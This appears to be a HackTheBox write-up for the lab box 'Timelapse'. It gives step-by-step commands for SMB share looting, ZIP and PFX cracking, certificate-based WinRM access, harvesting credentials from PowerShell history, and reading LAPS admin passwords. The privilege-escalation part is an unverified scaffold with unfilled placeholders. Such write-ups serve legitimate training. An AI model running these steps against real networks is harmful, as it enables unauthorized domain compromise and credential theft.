# Timelapse - HackTheBox Writeup

**OS:** Windows (Server 2019, Domain Controller)
**Difficulty:** Easy
**Topics:** Guest SMB Enumeration, SMB Share Looting, Encrypted ZIP Cracking, PFX Certificate Cracking, Certificate-based WinRM, PowerShell History Looting, LAPS Password Read

---

## Enumeration

```bash
nmap -sC -sV -v 10.129.82.230
```

Relevant ports:
- **53** - DNS (Simple DNS Plus)
- **88** - Kerberos
- **135/139/445** - RPC / NetBIOS / SMB
- **389/3268** - LDAP, `Domain: timelapse.htb`
- **464** - kpasswd5
- **593** - RPC over HTTP
- **636/3269** - LDAPS / Global Catalog over SSL
- **5986** - WinRM over **HTTPS** (`ssl/wsmans`) - note: no 5985 (HTTP), so WinRM is TLS-only here

Host info: `Host: DC01; OS: Windows`, cert CN `dc01.timelapse.htb`. SMB signing enabled and required. ~8h clock skew vs scanner (relevant if Kerberos is used later).

### SMB enumeration

A null session authenticates but **share enumeration as a pure null session is denied**:

```bash
nxc smb 10.129.82.230 -u '' -p '' --shares
# ... [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Falling back to the built-in **guest** account (empty password) unlocks the listing:

```bash
nxc smb 10.129.82.230 -u 'guest' -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$
C$
IPC$            READ            Remote IPC
NETLOGON
Shares          READ
SYSVOL
```

A non-standard **`Shares`** share is readable.

---

## Foothold

### 1. Loot the Shares

```bash
smbclient -N //10.129.82.230/Shares
```

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Contents:
- `Dev\winrm_backup.zip` - a password-protected ZIP
- `HelpDesk\LAPS.x64.msi`, `LAPS_Datasheet.docx`, `LAPS_OperationsGuide.docx`, `LAPS_TechnicalSpecification.docx` - LAPS documentation (a strong hint that **LAPS** is the privesc theme on this box)

### 2. Crack the ZIP

The ZIP contains `legacyy_dev_auth.pfx`. Extract the hash and crack with rockyou:

```bash
zip2john winrm_backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

ZIP password: **`supremelegacy`**

```bash
7z x winrm_backup.zip          # or: unzip winrm_backup.zip
```

### 3. Crack the PFX

The extracted `.pfx` (a PKCS#12 client certificate for WinRM auth) is itself password-protected:

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<!-- TODO: confirm the cracked PFX password from your run and paste it here -->
PFX password: **`<TODO: fill in>`**

### 4. Extract key + cert from the PFX

```bash
# Private key (unencrypted)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes
# Client certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy.crt
```

(openssl will prompt for the PFX import password cracked above.)

### 5. Certificate-based WinRM (port 5986 / SSL)

```bash
evil-winrm -i 10.129.82.230 -c legacyy.crt -k legacyy.key -S
```

- `-S` enables SSL (WinRM on 5986, since 5985 is closed here)
- `-c` / `-k` do **certificate** auth instead of a password

-> Shell as **`legacyy`**. `user.txt` on `C:\Users\legacyy\Desktop\`.

---

## Privilege Escalation

<!--
  SCAFFOLD - standard Timelapse path, to verify step-by-step as you go.
  Theme: PowerShell history -> svc_deploy creds -> svc_deploy is in LAPS_Readers
         -> read the LAPS-managed local Administrator password off the DC computer object.
-->

### 1. PowerShell history looting (as legacyy)

Check the current user's PowerShell console history - frequently left behind on this box:

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

<!-- TODO: paste the recovered svc_deploy credentials from the history file -->
The history reveals credentials for **`svc_deploy`**: `<TODO: fill in>`

### 2. Confirm svc_deploy's group membership

```bash
nxc ldap 10.129.82.230 -u svc_deploy -p '<password>' -M groupmembership -o USER=svc_deploy
```

or from a shell:

```powershell
net user svc_deploy
```

`svc_deploy` is a member of **`LAPS_Readers`** - a group granted the right to read the LAPS-managed local admin password attribute (`ms-Mcs-AdmPwd`) on domain computers.

### 3. Read the LAPS password for the DC

```bash
nxc ldap 10.129.82.230 -u svc_deploy -p '<password>' -M laps
```

<!-- TODO: paste the recovered LAPS Administrator password -->
Recovered local Administrator password: `<TODO: fill in>`

### 4. Administrator access

```bash
evil-winrm -i 10.129.82.230 -u Administrator -p '<LAPS password>' -S
```

-> Shell as **`Administrator`**. `root.txt` on `C:\Users\Administrator\Desktop\`.

<!-- Note: LAPS passwords rotate. If the recovered password stops working, re-read it via the -M laps module before reconnecting. -->

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | TCP scan, AD/DC fingerprinting, spotted WinRM-over-SSL only | nmap |
| SMB enum | Guest-session share listing (null denied) | NetExec (nxc) |
| Loot | Read `Shares`, pulled `winrm_backup.zip` + LAPS docs | smbclient |
| Crack #1 | Crack encrypted ZIP | zip2john + john (rockyou) |
| Crack #2 | Crack PFX certificate password | pfx2john + john (rockyou) |
| Prep | Extract key/cert from PFX | openssl |
| Foothold | Certificate-based WinRM over SSL | evil-winrm `-c/-k/-S` |
| Local enum | PowerShell history -> svc_deploy creds | ConsoleHost_history.txt |
| PrivEsc | svc_deploy in LAPS_Readers -> read DC LAPS password | NetExec `-M laps` |
| Admin access | WinRM as Administrator with LAPS password | evil-winrm |

---

## OSCP Notes

- When a **null session authenticates but `--shares` returns `ACCESS_DENIED`**, retry as the built-in `guest` account with an empty password - it often unlocks share enumeration on a DC where pure null does not.
- LAPS documentation sitting in a readable share is a **planted hint**: expect the privesc to end in reading a LAPS-managed local Administrator password. Note the theme early, come back to it after foothold.
- Password-protected archives and `.pfx`/`.p12` files crack with `john` via `zip2john` and `pfx2john` - both are usually fast against rockyou. Check `john <hash> --show` to recall a cracked password later.
- A `.pfx` is a **client certificate**, not a password: convert it with `openssl pkcs12` (`-nocerts -nodes` for the key, `-nokeys` for the cert) and authenticate with `evil-winrm -c cert -k key`, adding `-S` when only WinRM-over-HTTPS (5986) is open.
- `ConsoleHost_history.txt` (PSReadline) is one of the first things to grep after landing a Windows shell - admins and service setup scripts routinely leave plaintext credentials there.
- `LAPS_Readers` (or any group with read access to `ms-Mcs-AdmPwd`) is effectively a path to local admin on every LAPS-managed machine it covers; NetExec's `-M laps` module reads the attribute directly over LDAP with those creds.
- Remember LAPS passwords **rotate** - if a recovered one fails, read it again rather than assuming the account changed.
